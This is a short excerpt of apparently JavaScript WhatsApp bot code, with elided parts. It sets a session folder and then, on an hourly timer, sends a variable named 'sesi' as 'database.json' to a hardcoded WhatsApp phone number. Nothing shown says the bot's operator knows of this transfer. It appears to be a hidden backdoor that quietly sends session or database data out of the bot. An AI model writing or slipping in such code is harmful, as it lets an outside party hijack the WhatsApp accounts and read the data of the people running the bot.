...
const authFolder = `${opts._[0] || 'Rara'}`
...
setInterval(async () => {
    ...
    return await conn.sendMessage('6285716158365@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
